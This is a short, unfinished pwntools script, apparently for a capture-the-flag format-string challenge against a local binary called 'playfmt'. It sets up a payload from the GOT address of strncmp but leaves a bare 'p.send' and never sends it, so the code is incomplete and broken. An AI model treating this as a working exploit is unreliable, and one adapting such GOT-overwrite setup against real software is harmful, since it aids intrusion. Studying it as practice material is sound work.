#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context(arch = "i386", os = "linux", bits = 32)
elf = ELF("playfmt")
p = process("playfmt")

p.recvline()
p.recvline()
p.recvline()

payload  = p32(elf.got["strncmp"])

p.send

p.interactive()
p.close()
